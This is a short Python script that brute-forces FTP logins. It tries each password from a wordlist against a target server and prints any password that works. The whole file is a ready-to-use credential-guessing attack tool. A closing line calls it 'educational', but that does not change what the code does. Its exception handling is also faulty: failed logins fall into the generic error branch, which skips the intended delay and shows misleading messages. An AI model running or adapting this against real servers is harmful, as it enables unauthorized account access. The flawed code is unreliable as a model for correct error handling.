from ftplib import FTP, all_errors
from time import sleep

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange

def ftp_bruteforce(address, username, wordlist, delay, port):
    with open(wordlist, 'r') as wl:
        for line in wl:
            password = line.strip()
            try:
                ftp = FTP()
                ftp.connect(address, port)
                ftp.login(username, password)
                ftp.retrlines('LIST')
                print(f"{G}[*] Username: {username} | [*] Password found: {password}\n{W}")
                ftp.quit()
                break  # Exit after finding the correct password
            except all_errors as e:
                print(f"{R}[!] Oops, something went wrong! Check if you have typed everything correctly, as well as the FTP directory and port [!]{W}")
            except Exception as e:
                print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!\n{W}")
                sleep(delay)

# Note: This script is for educational purposes only.
